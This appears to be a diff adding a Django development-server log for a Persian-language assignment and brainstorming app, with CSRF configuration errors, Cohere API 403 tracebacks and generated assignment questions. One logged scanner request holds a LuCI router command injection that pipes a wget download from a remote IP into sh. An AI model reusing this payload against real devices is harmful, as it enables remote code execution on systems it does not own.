@@ -1,0 +1,2298 @@
+Watching for file changes with StatReloader
+/usr/lib/python3/dist-packages/requests/__init__.py:87: RequestsDependencyWarning: urllib3 (2.2.1) or chardet (4.0.0) doesn't match a supported version!
+  warnings.warn("urllib3 ({}) or chardet ({}) doesn't match a supported "
+[06/Jun/2024 11:13:38] "OPTIONS /auth/jwt/create/ HTTP/1.1" 200 0
+[06/Jun/2024 11:13:46] "OPTIONS /auth/jwt/create/ HTTP/1.1" 200 0
+[06/Jun/2024 11:13:54] "OPTIONS /auth/jwt/create/ HTTP/1.1" 200 0
+[06/Jun/2024 11:14:04] "OPTIONS /auth/jwt/create/ HTTP/1.1" 200 0
+Watching for file changes with StatReloader
+/usr/lib/python3/dist-packages/requests/__init__.py:87: RequestsDependencyWarning: urllib3 (2.2.1) or chardet (4.0.0) doesn't match a supported version!
+  warnings.warn("urllib3 ({}) or chardet ({}) doesn't match a supported "
+[06/Jun/2024 11:19:19] "OPTIONS /auth/jwt/create/ HTTP/1.1" 200 0
+[06/Jun/2024 11:19:42] "OPTIONS /auth/jwt/create/ HTTP/1.1" 200 0
+[06/Jun/2024 11:21:18] "OPTIONS /auth/jwt/create/ HTTP/1.1" 200 0
+[06/Jun/2024 11:21:46] "OPTIONS /auth/jwt/create/ HTTP/1.1" 200 0
+[06/Jun/2024 11:28:34] "OPTIONS /auth/jwt/create/ HTTP/1.1" 200 0
+[06/Jun/2024 11:28:39] "OPTIONS /auth/jwt/create/ HTTP/1.1" 200 0
+[06/Jun/2024 11:29:29] "OPTIONS /auth/jwt/create/ HTTP/1.1" 200 0
+Watching for file changes with StatReloader
+/usr/lib/python3/dist-packages/requests/__init__.py:87: RequestsDependencyWarning: urllib3 (2.2.1) or chardet (4.0.0) doesn't match a supported version!
+  warnings.warn("urllib3 ({}) or chardet ({}) doesn't match a supported "
+[06/Jun/2024 11:32:13] "OPTIONS /auth/jwt/create/ HTTP/1.1" 200 0
+[06/Jun/2024 11:32:18] "OPTIONS /auth/jwt/create/ HTTP/1.1" 200 0
+Watching for file changes with StatReloader
+/usr/lib/python3/dist-packages/requests/__init__.py:87: RequestsDependencyWarning: urllib3 (2.2.1) or chardet (4.0.0) doesn't match a supported version!
+  warnings.warn("urllib3 ({}) or chardet ({}) doesn't match a supported "
+Exception in thread django-main-thread:
+Traceback (most recent call last):
+  File "/usr/lib/python3.10/threading.py", line 1016, in _bootstrap_inner
+    self.run()
+  File "/usr/lib/python3.10/threading.py", line 953, in run
+    self._target(*self._args, **self._kwargs)
+  File "/usr/local/lib/python3.10/dist-packages/django/utils/autoreload.py", line 64, in wrapper
+    fn(*args, **kwargs)
+  File "/usr/local/lib/python3.10/dist-packages/django/core/management/commands/runserver.py", line 133, in inner_run
+    self.check(display_num_errors=True)
+  File "/usr/local/lib/python3.10/dist-packages/django/core/management/base.py", line 563, in check
+    raise SystemCheckError(msg)
+django.core.management.base.SystemCheckError: SystemCheckError: System check identified some issues:
+
+ERRORS:
+?: (4_0.E001) As of Django 4.0, the values in the CSRF_TRUSTED_ORIGINS setting must start with a scheme (usually http:// or https://) but found 127.0.0.1. See the release notes for details.
+?: (4_0.E001) As of Django 4.0, the values in the CSRF_TRUSTED_ORIGINS setting must start with a scheme (usually http:// or https://) but found 82.115.20.169. See the release notes for details.
+?: (4_0.E001) As of Django 4.0, the values in the CSRF_TRUSTED_ORIGINS setting must start with a scheme (usually http:// or https://) but found [::1]. See the release notes for details.
+?: (4_0.E001) As of Django 4.0, the values in the CSRF_TRUSTED_ORIGINS setting must start with a scheme (usually http:// or https://) but found localhost. See the release notes for details.
+?: (4_0.E001) As of Django 4.0, the values in the CSRF_TRUSTED_ORIGINS setting must start with a scheme (usually http:// or https://) but found testserver. See the release notes for details.
+
+System check identified 5 issues (0 silenced).
+Watching for file changes with StatReloader
+/usr/lib/python3/dist-packages/requests/__init__.py:87: RequestsDependencyWarning: urllib3 (2.2.1) or chardet (4.0.0) doesn't match a supported version!
+  warnings.warn("urllib3 ({}) or chardet ({}) doesn't match a supported "
+Exception in thread django-main-thread:
+Traceback (most recent call last):
+  File "/usr/lib/python3.10/threading.py", line 1016, in _bootstrap_inner
+    self.run()
+  File "/usr/lib/python3.10/threading.py", line 953, in run
+    self._target(*self._args, **self._kwargs)
+  File "/usr/local/lib/python3.10/dist-packages/django/utils/autoreload.py", line 64, in wrapper
+    fn(*args, **kwargs)
+  File "/usr/local/lib/python3.10/dist-packages/django/core/management/commands/runserver.py", line 133, in inner_run
+    self.check(display_num_errors=True)
+  File "/usr/local/lib/python3.10/dist-packages/django/core/management/base.py", line 563, in check
+    raise SystemCheckError(msg)
+django.core.management.base.SystemCheckError: SystemCheckError: System check identified some issues:
+
+ERRORS:
+?: (4_0.E001) As of Django 4.0, the values in the CSRF_TRUSTED_ORIGINS setting must start with a scheme (usually http:// or https://) but found 127.0.0.1. See the release notes for details.
+?: (4_0.E001) As of Django 4.0, the values in the CSRF_TRUSTED_ORIGINS setting must start with a scheme (usually http:// or https://) but found 82.115.20.169. See the release notes for details.
+?: (4_0.E001) As of Django 4.0, the values in the CSRF_TRUSTED_ORIGINS setting must start with a scheme (usually http:// or https://) but found [::1]. See the release notes for details.
+?: (4_0.E001) As of Django 4.0, the values in the CSRF_TRUSTED_ORIGINS setting must start with a scheme (usually http:// or https://) but found localhost. See the release notes for details.
+?: (4_0.E001) As of Django 4.0, the values in the CSRF_TRUSTED_ORIGINS setting must start with a scheme (usually http:// or https://) but found testserver. See the release notes for details.
+
+System check identified 5 issues (0 silenced).
+/root/Project/Backend/backend/settings.py changed, reloading.
+Performing system checks...
+
+/root/Project/Backend/backend/settings.py changed, reloading.
+Performing system checks...
+
+Watching for file changes with StatReloader
+/usr/lib/python3/dist-packages/requests/__init__.py:87: RequestsDependencyWarning: urllib3 (2.2.1) or chardet (4.0.0) doesn't match a supported version!
+  warnings.warn("urllib3 ({}) or chardet ({}) doesn't match a supported "
+Watching for file changes with StatReloader
+/usr/lib/python3/dist-packages/requests/__init__.py:87: RequestsDependencyWarning: urllib3 (2.2.1) or chardet (4.0.0) doesn't match a supported version!
+  warnings.warn("urllib3 ({}) or chardet ({}) doesn't match a supported "
+Error: That port is already in use.
+Watching for file changes with StatReloader
+/usr/lib/python3/dist-packages/requests/__init__.py:87: RequestsDependencyWarning: urllib3 (2.2.1) or chardet (4.0.0) doesn't match a supported version!
+  warnings.warn("urllib3 ({}) or chardet ({}) doesn't match a supported "
+[07/Jun/2024 12:06:09] "OPTIONS /auth/jwt/create/ HTTP/1.1" 200 0
+[07/Jun/2024 12:06:15] "POST /auth/jwt/create/ HTTP/1.1" 200 483
+[07/Jun/2024 12:06:17] "OPTIONS /api/assignments/ HTTP/1.1" 200 0
+[07/Jun/2024 12:06:18] "OPTIONS /api/courses/ HTTP/1.1" 200 0
+[07/Jun/2024 12:06:18] "GET /api/assignments/ HTTP/1.1" 200 448
+[07/Jun/2024 12:06:18] "OPTIONS /api/courses/ HTTP/1.1" 200 0
+[07/Jun/2024 12:06:18] "OPTIONS /api/assignments/ HTTP/1.1" 200 0
+[07/Jun/2024 12:06:18] "GET /api/assignments/ HTTP/1.1" 200 448
+[07/Jun/2024 12:06:19] "GET /api/courses/ HTTP/1.1" 200 99
+[07/Jun/2024 12:06:22] "GET /api/courses/ HTTP/1.1" 200 99
+[07/Jun/2024 12:06:27] "OPTIONS /api/brainstorms/?assignment_id=1 HTTP/1.1" 200 0
+[07/Jun/2024 12:06:27] "OPTIONS /api/brainstorms/?assignment_id=1 HTTP/1.1" 200 0
+[07/Jun/2024 12:06:29] "GET /api/brainstorms/?assignment_id=1 HTTP/1.1" 200 3238
+[07/Jun/2024 12:06:33] "GET /api/brainstorms/?assignment_id=1 HTTP/1.1" 200 3238
+[07/Jun/2024 12:06:39] "OPTIONS /api/brainstorms/ HTTP/1.1" 200 0
+Internal Server Error: /api/brainstorms/
+Traceback (most recent call last):
+  File "/usr/local/lib/python3.10/dist-packages/cohere/base_client.py", line 907, in chat
+    _response_json = _response.json()
+  File "/usr/local/lib/python3.10/dist-packages/httpx/_models.py", line 764, in json
+    return jsonlib.loads(self.content, **kwargs)
+  File "/usr/lib/python3.10/json/__init__.py", line 346, in loads
+    return _default_decoder.decode(s)
+  File "/usr/lib/python3.10/json/decoder.py", line 337, in decode
+    obj, end = self.raw_decode(s, idx=_w(s, 0).end())
+  File "/usr/lib/python3.10/json/decoder.py", line 355, in raw_decode
+    raise JSONDecodeError("Expecting value", s, err.value) from None
+json.decoder.JSONDecodeError: Expecting value: line 2 column 1 (char 1)
+
+During handling of the above exception, another exception occurred:
+
+Traceback (most recent call last):
+  File "/usr/local/lib/python3.10/dist-packages/django/core/handlers/exception.py", line 55, in inner
+    response = get_response(request)
+  File "/usr/local/lib/python3.10/dist-packages/django/core/handlers/base.py", line 197, in _get_response
+    response = wrapped_callback(request, *callback_args, **callback_kwargs)
+  File "/usr/local/lib/python3.10/dist-packages/django/views/decorators/csrf.py", line 65, in _view_wrapper
+    return view_func(request, *args, **kwargs)
+  File "/usr/local/lib/python3.10/dist-packages/rest_framework/viewsets.py", line 124, in view
+    return self.dispatch(request, *args, **kwargs)
+  File "/usr/local/lib/python3.10/dist-packages/rest_framework/views.py", line 509, in dispatch
+    response = self.handle_exception(exc)
+  File "/usr/local/lib/python3.10/dist-packages/rest_framework/views.py", line 469, in handle_exception
+    self.raise_uncaught_exception(exc)
+  File "/usr/local/lib/python3.10/dist-packages/rest_framework/views.py", line 480, in raise_uncaught_exception
+    raise exc
+  File "/usr/local/lib/python3.10/dist-packages/rest_framework/views.py", line 506, in dispatch
+    response = handler(request, *args, **kwargs)
+  File "/root/Project/Backend/brainstorming/views.py", line 94, in create
+    llm_response = llm.invoke(prompt).content
+  File "/usr/local/lib/python3.10/dist-packages/langchain_core/language_models/chat_models.py", line 170, in invoke
+    self.generate_prompt(
+  File "/usr/local/lib/python3.10/dist-packages/langchain_core/language_models/chat_models.py", line 599, in generate_prompt
+    return self.generate(prompt_messages, stop=stop, callbacks=callbacks, **kwargs)
+  File "/usr/local/lib/python3.10/dist-packages/langchain_core/language_models/chat_models.py", line 456, in generate
+    raise e
+  File "/usr/local/lib/python3.10/dist-packages/langchain_core/language_models/chat_models.py", line 446, in generate
+    self._generate_with_cache(
+  File "/usr/local/lib/python3.10/dist-packages/langchain_core/language_models/chat_models.py", line 671, in _generate_with_cache
+    result = self._generate(
+  File "/usr/local/lib/python3.10/dist-packages/langchain_cohere/chat_models.py", line 433, in _generate
+    response = self.client.chat(**request)
+  File "/usr/local/lib/python3.10/dist-packages/cohere/client.py", line 33, in wrapped
+    return method(*args, **kwargs)
+  File "/usr/local/lib/python3.10/dist-packages/cohere/base_client.py", line 909, in chat
+    raise ApiError(status_code=_response.status_code, body=_response.text)
+cohere.core.api_error.ApiError: status_code: 403, body: 
+<html><head>
+<meta http-equiv="content-type" content="text/html;charset=utf-8">
+<title>403 Forbidden</title>
+</head>
+<body text=#000000 bgcolor=#ffffff>
+<h1>Error: Forbidden</h1>
+<h2>Your client does not have permission to get URL <code>/v1/chat</code> from this server.</h2>
+<h2></h2>
+</body></html>
+
+[07/Jun/2024 12:06:47] "POST /api/brainstorms/ HTTP/1.1" 500 194861
+Watching for file changes with StatReloader
+/usr/lib/python3/dist-packages/requests/__init__.py:87: RequestsDependencyWarning: urllib3 (2.2.1) or chardet (4.0.0) doesn't match a supported version!
+  warnings.warn("urllib3 ({}) or chardet ({}) doesn't match a supported "
+[13/Jun/2024 18:29:34] "OPTIONS /auth/jwt/create/ HTTP/1.1" 200 0
+[13/Jun/2024 18:29:35] "POST /auth/jwt/create/ HTTP/1.1" 200 483
+[13/Jun/2024 18:29:37] "OPTIONS /api/courses/ HTTP/1.1" 200 0
+[13/Jun/2024 18:29:37] "OPTIONS /api/assignments/ HTTP/1.1" 200 0
+[13/Jun/2024 18:29:37] "OPTIONS /api/assignments/ HTTP/1.1" 200 0
+[13/Jun/2024 18:29:37] "GET /api/assignments/ HTTP/1.1" 200 448
+[13/Jun/2024 18:29:38] "GET /api/courses/ HTTP/1.1" 200 99
+[13/Jun/2024 18:29:38] "GET /api/assignments/ HTTP/1.1" 200 448
+[13/Jun/2024 18:29:40] "OPTIONS /api/courses/ HTTP/1.1" 200 0
+[13/Jun/2024 18:29:41] "GET /api/courses/ HTTP/1.1" 200 99
+[13/Jun/2024 18:29:41] "OPTIONS /api/questions/ HTTP/1.1" 200 0
+[13/Jun/2024 18:29:41] "OPTIONS /api/questions/ HTTP/1.1" 200 0
+[13/Jun/2024 18:29:41] "GET /api/questions/ HTTP/1.1" 200 2394
+[13/Jun/2024 18:29:42] "GET /api/questions/ HTTP/1.1" 200 2394
+[13/Jun/2024 18:29:47] "GET /api/assignments/ HTTP/1.1" 200 448
+[13/Jun/2024 18:29:47] "GET /api/courses/ HTTP/1.1" 200 99
+[13/Jun/2024 18:29:47] "GET /api/courses/ HTTP/1.1" 200 99
+[13/Jun/2024 18:29:47] "GET /api/assignments/ HTTP/1.1" 200 448
+[13/Jun/2024 18:29:52] "OPTIONS /api/brainstorms/?assignment_id=1 HTTP/1.1" 200 0
+[13/Jun/2024 18:29:52] "OPTIONS /api/brainstorms/?assignment_id=1 HTTP/1.1" 200 0
+[13/Jun/2024 18:29:52] "GET /api/brainstorms/?assignment_id=1 HTTP/1.1" 200 3370
+[13/Jun/2024 18:29:52] "GET /api/brainstorms/?assignment_id=1 HTTP/1.1" 200 3370
+[13/Jun/2024 18:29:55] "OPTIONS /api/ideas/?brainstorm_id=27 HTTP/1.1" 200 0
+[13/Jun/2024 18:29:55] "OPTIONS /api/ideas/?brainstorm_id=27 HTTP/1.1" 200 0
+[13/Jun/2024 18:29:55] "GET /api/ideas/?brainstorm_id=27 HTTP/1.1" 200 1355
+[13/Jun/2024 18:29:56] "GET /api/ideas/?brainstorm_id=27 HTTP/1.1" 200 1355
+[13/Jun/2024 18:30:01] "POST /api/questions/ HTTP/1.1" 201 923
+[13/Jun/2024 18:30:01] "GET /api/questions/ HTTP/1.1" 200 3318
+[13/Jun/2024 18:30:02] "GET /api/questions/ HTTP/1.1" 200 3318
+[13/Jun/2024 18:35:37] "POST /auth/jwt/create/ HTTP/1.1" 200 483
+[13/Jun/2024 18:35:40] "GET /api/assignments/ HTTP/1.1" 200 448
+[13/Jun/2024 18:35:40] "GET /api/courses/ HTTP/1.1" 200 99
+[13/Jun/2024 18:35:40] "GET /api/courses/ HTTP/1.1" 200 99
+[13/Jun/2024 18:35:44] "OPTIONS /api/questions/sorted/1/ HTTP/1.1" 200 0
+[13/Jun/2024 18:35:44] "OPTIONS /api/questions/sorted/1/ HTTP/1.1" 200 0
+[13/Jun/2024 18:35:44] "GET /api/questions/sorted/1/ HTTP/1.1" 200 3318
+[13/Jun/2024 18:35:46] "GET /api/assignments/ HTTP/1.1" 200 448
+[13/Jun/2024 18:35:47] "GET /api/questions/sorted/1/ HTTP/1.1" 200 3318
+[13/Jun/2024 18:35:56] "OPTIONS /generate_pdf/ HTTP/1.1" 200 0
+[13/Jun/2024 18:35:57] "POST /generate_pdf/ HTTP/1.1" 200 41
+[13/Jun/2024 18:37:41] "OPTIONS /api/questions/7/ HTTP/1.1" 200 0
+[13/Jun/2024 18:37:42] "OPTIONS /api/questions/7/ HTTP/1.1" 200 0
+[13/Jun/2024 18:37:43] "PATCH /api/questions/7/ HTTP/1.1" 200 759
+[13/Jun/2024 18:37:43] "PATCH /api/questions/7/ HTTP/1.1" 200 759
+[13/Jun/2024 18:37:43] "OPTIONS /api/questions/8/ HTTP/1.1" 200 0
+[13/Jun/2024 18:37:44] "OPTIONS /api/questions/8/ HTTP/1.1" 200 0
+[13/Jun/2024 18:37:44] "PATCH /api/questions/8/ HTTP/1.1" 200 924
+[13/Jun/2024 18:37:45] "PATCH /api/questions/8/ HTTP/1.1" 200 924
+[13/Jun/2024 18:37:45] "OPTIONS /api/questions/6/ HTTP/1.1" 200 0
+[13/Jun/2024 18:37:45] "PATCH /api/questions/6/ HTTP/1.1" 200 379
+[13/Jun/2024 18:37:45] "PATCH /api/questions/6/ HTTP/1.1" 200 379
+[13/Jun/2024 18:37:48] "POST /generate_pdf/ HTTP/1.1" 200 41
+[13/Jun/2024 21:01:08] code 400, message Bad request version ('À\x14À')
+[13/Jun/2024 21:01:08] You're accessing the development server over HTTPS, but it only supports HTTP.
+[13/Jun/2024 22:39:31,867] - Broken pipe from ('162.142.125.217', 49662)
+Not Found: /
+[13/Jun/2024 22:39:35] "GET / HTTP/1.1" 404 2932
+[13/Jun/2024 22:39:35,164] - Broken pipe from ('162.142.125.217', 49696)
+Not Found: /
+[13/Jun/2024 22:39:39] "GET / HTTP/1.1" 404 2932
+[13/Jun/2024 22:39:40] code 505, message Invalid HTTP version (2.0)
+[13/Jun/2024 22:39:40] "PRI * HTTP/2.0" 505 -
+Not Found: /
+[14/Jun/2024 01:08:30] "GET / HTTP/1.1" 404 2932
+[14/Jun/2024 01:51:27,400] - Broken pipe from ('167.94.145.105', 47634)
+Not Found: /
+[14/Jun/2024 01:51:30] "GET / HTTP/1.1" 404 2932
+[14/Jun/2024 01:51:30,420] - Broken pipe from ('167.94.145.105', 47668)
+Not Found: /
+[14/Jun/2024 01:51:33] "GET / HTTP/1.1" 404 2932
+[14/Jun/2024 01:51:33] code 505, message Invalid HTTP version (2.0)
+[14/Jun/2024 01:51:33] "PRI * HTTP/2.0" 505 -
+Not Found: /
+[14/Jun/2024 04:03:55] "GET / HTTP/1.1" 404 2932
+[14/Jun/2024 04:30:07,514] - Broken pipe from ('167.94.145.105', 47066)
+Not Found: /
+[14/Jun/2024 04:30:10] "GET / HTTP/1.1" 404 2932
+[14/Jun/2024 04:30:10,532] - Broken pipe from ('167.94.145.105', 47096)
+Not Found: /
+[14/Jun/2024 04:30:13] "GET / HTTP/1.1" 404 2932
+[14/Jun/2024 04:30:13] code 505, message Invalid HTTP version (2.0)
+[14/Jun/2024 04:30:13] "PRI * HTTP/2.0" 505 -
+Not Found: /
+[14/Jun/2024 07:31:09] "GET / HTTP/1.1" 404 2932
+Not Found: /cgi-bin/luci/;stok=/locale
+[14/Jun/2024 09:29:28] "GET /cgi-bin/luci/;stok=/locale?form=country&operation=write&country=$(id%3E%60wget+http%3A%2F%2F103.149.28.141%2Ft+-O-+|+sh%60) HTTP/1.1" 404 3139
+[14/Jun/2024 09:29:34,006] - Broken pipe from ('31.220.1.83', 48470)
+[14/Jun/2024 09:46:00] "OPTIONS /auth/jwt/create/ HTTP/1.1" 200 0
+[14/Jun/2024 09:46:01] "POST /auth/jwt/create/ HTTP/1.1" 200 483
+[14/Jun/2024 09:46:03] "OPTIONS /api/courses/ HTTP/1.1" 200 0
+[14/Jun/2024 09:46:03] "OPTIONS /api/assignments/ HTTP/1.1" 200 0
+[14/Jun/2024 09:46:03] "GET /api/courses/ HTTP/1.1" 200 99
+[14/Jun/2024 09:46:03] "OPTIONS /api/assignments/ HTTP/1.1" 200 0
+[14/Jun/2024 09:46:03] "GET /api/assignments/ HTTP/1.1" 200 448
+[14/Jun/2024 09:46:03] "GET /api/assignments/ HTTP/1.1" 200 448
+[14/Jun/2024 09:46:24] "OPTIONS /api/brainstorms/?assignment_id=1 HTTP/1.1" 200 0
+[14/Jun/2024 09:46:24] "OPTIONS /api/brainstorms/?assignment_id=1 HTTP/1.1" 200 0
+[14/Jun/2024 09:46:24] "GET /api/brainstorms/?assignment_id=1 HTTP/1.1" 200 3370
+[14/Jun/2024 09:46:24] "GET /api/brainstorms/?assignment_id=1 HTTP/1.1" 200 3370
+[14/Jun/2024 09:46:44] "OPTIONS /api/brainstorms/ HTTP/1.1" 200 0
+Internal Server Error: /api/brainstorms/
+Traceback (most recent call last):
+  File "/usr/local/lib/python3.10/dist-packages/cohere/base_client.py", line 907, in chat
+    _response_json = _response.json()
+  File "/usr/local/lib/python3.10/dist-packages/httpx/_models.py", line 764, in json
+    return jsonlib.loads(self.content, **kwargs)
+  File "/usr/lib/python3.10/json/__init__.py", line 346, in loads
+    return _default_decoder.decode(s)
+  File "/usr/lib/python3.10/json/decoder.py", line 337, in decode
+    obj, end = self.raw_decode(s, idx=_w(s, 0).end())
+  File "/usr/lib/python3.10/json/decoder.py", line 355, in raw_decode
+    raise JSONDecodeError("Expecting value", s, err.value) from None
+json.decoder.JSONDecodeError: Expecting value: line 2 column 1 (char 1)
+
+During handling of the above exception, another exception occurred:
+
+Traceback (most recent call last):
+  File "/usr/local/lib/python3.10/dist-packages/django/core/handlers/exception.py", line 55, in inner
+    response = get_response(request)
+  File "/usr/local/lib/python3.10/dist-packages/django/core/handlers/base.py", line 197, in _get_response
+    response = wrapped_callback(request, *callback_args, **callback_kwargs)
+  File "/usr/local/lib/python3.10/dist-packages/django/views/decorators/csrf.py", line 65, in _view_wrapper
+    return view_func(request, *args, **kwargs)
+  File "/usr/local/lib/python3.10/dist-packages/rest_framework/viewsets.py", line 124, in view
+    return self.dispatch(request, *args, **kwargs)
+  File "/usr/local/lib/python3.10/dist-packages/rest_framework/views.py", line 509, in dispatch
+    response = self.handle_exception(exc)
+  File "/usr/local/lib/python3.10/dist-packages/rest_framework/views.py", line 469, in handle_exception
+    self.raise_uncaught_exception(exc)
+  File "/usr/local/lib/python3.10/dist-packages/rest_framework/views.py", line 480, in raise_uncaught_exception
+    raise exc
+  File "/usr/local/lib/python3.10/dist-packages/rest_framework/views.py", line 506, in dispatch
+    response = handler(request, *args, **kwargs)
+  File "/root/Project/Backend/brainstorming/views.py", line 94, in create
+    llm_response = llm.invoke(prompt).content
+  File "/usr/local/lib/python3.10/dist-packages/langchain_core/language_models/chat_models.py", line 170, in invoke
+    self.generate_prompt(
+  File "/usr/local/lib/python3.10/dist-packages/langchain_core/language_models/chat_models.py", line 599, in generate_prompt
+    return self.generate(prompt_messages, stop=stop, callbacks=callbacks, **kwargs)
+  File "/usr/local/lib/python3.10/dist-packages/langchain_core/language_models/chat_models.py", line 456, in generate
+    raise e
+  File "/usr/local/lib/python3.10/dist-packages/langchain_core/language_models/chat_models.py", line 446, in generate
+    self._generate_with_cache(
+  File "/usr/local/lib/python3.10/dist-packages/langchain_core/language_models/chat_models.py", line 671, in _generate_with_cache
+    result = self._generate(
+  File "/usr/local/lib/python3.10/dist-packages/langchain_cohere/chat_models.py", line 433, in _generate
+    response = self.client.chat(**request)
+  File "/usr/local/lib/python3.10/dist-packages/cohere/client.py", line 33, in wrapped
+    return method(*args, **kwargs)
+  File "/usr/local/lib/python3.10/dist-packages/cohere/base_client.py", line 909, in chat
+    raise ApiError(status_code=_response.status_code, body=_response.text)
+cohere.core.api_error.ApiError: status_code: 403, body: 
+<html><head>
+<meta http-equiv="content-type" content="text/html;charset=utf-8">
+<title>403 Forbidden</title>
+</head>
+<body text=#000000 bgcolor=#ffffff>
+<h1>Error: Forbidden</h1>
+<h2>Your client does not have permission to get URL <code>/v1/chat</code> from this server.</h2>
+<h2></h2>
+</body></html>
+
+[14/Jun/2024 09:46:45] "POST /api/brainstorms/ HTTP/1.1" 500 196204
+[14/Jun/2024 09:47:30] "POST /auth/jwt/create/ HTTP/1.1" 200 483
+[14/Jun/2024 09:47:32] "GET /api/courses/ HTTP/1.1" 200 99
+[14/Jun/2024 09:47:32] "GET /api/assignments/ HTTP/1.1" 200 448
+[14/Jun/2024 09:47:32] "GET /api/assignments/ HTTP/1.1" 200 448
+[14/Jun/2024 09:47:33] "GET /api/courses/ HTTP/1.1" 200 99
+[14/Jun/2024 09:47:35] "GET /api/brainstorms/?assignment_id=1 HTTP/1.1" 200 3577
+[14/Jun/2024 09:47:35] "GET /api/brainstorms/?assignment_id=1 HTTP/1.1" 200 3577
+[14/Jun/2024 09:47:56] "POST /api/brainstorms/ HTTP/1.1" 201 160
+[14/Jun/2024 09:47:56] "GET /api/brainstorms/?assignment_id=1 HTTP/1.1" 200 3738
+[14/Jun/2024 09:48:02] "OPTIONS /api/ideas/?brainstorm_id=30 HTTP/1.1" 200 0
+[14/Jun/2024 09:48:02] "GET /api/ideas/?brainstorm_id=30 HTTP/1.1" 200 1899
+[14/Jun/2024 09:48:02] "OPTIONS /api/ideas/?brainstorm_id=30 HTTP/1.1" 200 0
+[14/Jun/2024 09:48:02] "GET /api/ideas/?brainstorm_id=30 HTTP/1.1" 200 1899
+[14/Jun/2024 09:49:28] "GET /api/courses/ HTTP/1.1" 200 99
+[14/Jun/2024 09:49:28] "GET /api/assignments/ HTTP/1.1" 200 448
+[14/Jun/2024 09:49:30] "GET /api/courses/ HTTP/1.1" 200 99
+[14/Jun/2024 09:49:30] "GET /api/assignments/ HTTP/1.1" 200 448
+[14/Jun/2024 09:49:31] "GET /api/courses/ HTTP/1.1" 200 99
+[14/Jun/2024 09:49:31] "GET /api/assignments/ HTTP/1.1" 200 448
+[14/Jun/2024 09:49:41] "OPTIONS /api/questions/sorted/1/ HTTP/1.1" 200 0
+[14/Jun/2024 09:49:41] "OPTIONS /api/questions/sorted/1/ HTTP/1.1" 200 0
+[14/Jun/2024 09:49:41] "GET /api/questions/sorted/1/ HTTP/1.1" 200 3321
+[14/Jun/2024 09:49:42] "GET /api/questions/sorted/1/ HTTP/1.1" 200 3321
+[14/Jun/2024 09:49:45] "OPTIONS /api/questions/7/ HTTP/1.1" 200 0
+[14/Jun/2024 09:49:45] "PATCH /api/questions/7/ HTTP/1.1" 200 758
+[14/Jun/2024 09:49:45] "OPTIONS /api/questions/8/ HTTP/1.1" 200 0
+[14/Jun/2024 09:49:46] "PATCH /api/questions/8/ HTTP/1.1" 200 923
+[14/Jun/2024 09:49:47] "OPTIONS /generate_pdf/ HTTP/1.1" 200 0
+[14/Jun/2024 09:49:48] "POST /generate_pdf/ HTTP/1.1" 200 41
+[14/Jun/2024 09:50:06] "GET /api/courses/ HTTP/1.1" 200 99
+[14/Jun/2024 09:50:06] "GET /api/assignments/ HTTP/1.1" 200 448
+[14/Jun/2024 09:50:06] "GET /api/assignments/ HTTP/1.1" 200 448
+[14/Jun/2024 09:50:06] "GET /api/courses/ HTTP/1.1" 200 99
+[14/Jun/2024 09:50:12] "GET /api/brainstorms/?assignment_id=1 HTTP/1.1" 200 3738
+[14/Jun/2024 09:50:12] "GET /api/brainstorms/?assignment_id=1 HTTP/1.1" 200 3738
+[14/Jun/2024 09:50:16] "GET /api/ideas/?brainstorm_id=30 HTTP/1.1" 200 1899
+[14/Jun/2024 09:50:16] "GET /api/ideas/?brainstorm_id=30 HTTP/1.1" 200 1899
+[14/Jun/2024 09:50:42] "OPTIONS /api/questions/ HTTP/1.1" 200 0
+[14/Jun/2024 09:50:45] "POST /api/questions/ HTTP/1.1" 201 1455
+[14/Jun/2024 09:50:46] "GET /api/questions/ HTTP/1.1" 200 4775
+[14/Jun/2024 09:50:47] "GET /api/questions/ HTTP/1.1" 200 4775
+[14/Jun/2024 09:51:12] "GET /api/assignments/ HTTP/1.1" 200 448
+[14/Jun/2024 09:51:12] "GET /api/courses/ HTTP/1.1" 200 99
+[14/Jun/2024 09:51:12] "GET /api/courses/ HTTP/1.1" 200 99
+[14/Jun/2024 09:51:13] "GET /api/assignments/ HTTP/1.1" 200 448
+[14/Jun/2024 09:51:16] "GET /api/questions/sorted/1/ HTTP/1.1" 200 4775
+[14/Jun/2024 09:51:16] "GET /api/questions/sorted/1/ HTTP/1.1" 200 4775
+[14/Jun/2024 09:51:20] "POST /generate_pdf/ HTTP/1.1" 200 41
+[14/Jun/2024 09:53:05] "POST /generate_pdf/ HTTP/1.1" 200 41
+/root/Project/Backend/assignment/assignment_generator/create_assignment.py changed, reloading.
+Performing system checks...
+
+System check identified no issues (0 silenced).
+June 13, 2024 - 18:29:17
+Django version 5.0.6, using settings 'backend.settings'
+Starting development server at http://0.0.0.0:8000/
+Quit the server with CONTROL-C.
+
+27
+27
+با توجه به درخواست شما، اینجا نسخه ویرایش شده سوال تکلیف شما بدون هیچ گونه اطلاعات شخصی است:
+
+«1- تنوع فرهنگی در آداب و رسوم خوشامدگویی را بررسی کنید و تاثیر آن را بر روابط اجتماعی مورد تحلیل قرار دهید.
+
+2- چرا مردم می‌پرسند "سلام، خوبید؟" و این پرسش چگونه در فرهنگ‌های مختلف متفاوت است؟»
+Removed: latex/assignment_pdf.pdf
+Removed: latex/assignment_pdf.tex
+All files in the latex folder have been removed successfully.
+hear we are {'is_selected_for_assignment': False} چگونه فرهنگ‌های مختلف در مراسم احوالپرسی با یکدیگر تفاوت دارند و این تفاوت‌ها چه تأثیری بر روابط اجتماعی دارد؟ چرا مردم می‌پرسند: «سلام، خوبید؟» و این سؤال در فرهنگ‌های مختلف چگونه متفاوت است؟
+hear we are {'is_selected_for_assignment': False} چگونه فرهنگ‌های مختلف در مراسم احوالپرسی با یکدیگر تفاوت دارند و این تفاوت‌ها چه تأثیری بر روابط اجتماعی دارد؟ چرا مردم می‌پرسند: «سلام، خوبید؟» و این سؤال در فرهنگ‌های مختلف چگونه متفاوت است؟
+hear we are {'is_selected_for_assignment': False} با توجه به درخواست شما، اینجا نسخه ویرایش شده سوال تکلیف شما بدون هیچ گونه اطلاعات شخصی است:
+
+«1- تنوع فرهنگی در آداب و رسوم خوشامدگویی را بررسی کنید و تاثیر آن را بر روابط اجتماعی مورد تحلیل قرار دهید.
+
+2- چرا مردم می‌پرسند "سلام، خوبید؟" و این پرسش چگونه در فرهنگ‌های مختلف متفاوت است؟»
+hear we are {'is_selected_for_assignment': False} با توجه به درخواست شما، اینجا نسخه ویرایش شده سوال تکلیف شما بدون هیچ گونه اطلاعات شخصی است:
+
+«1- تنوع فرهنگی در آداب و رسوم خوشامدگویی را بررسی کنید و تاثیر آن را بر روابط اجتماعی مورد تحلیل قرار دهید.
+
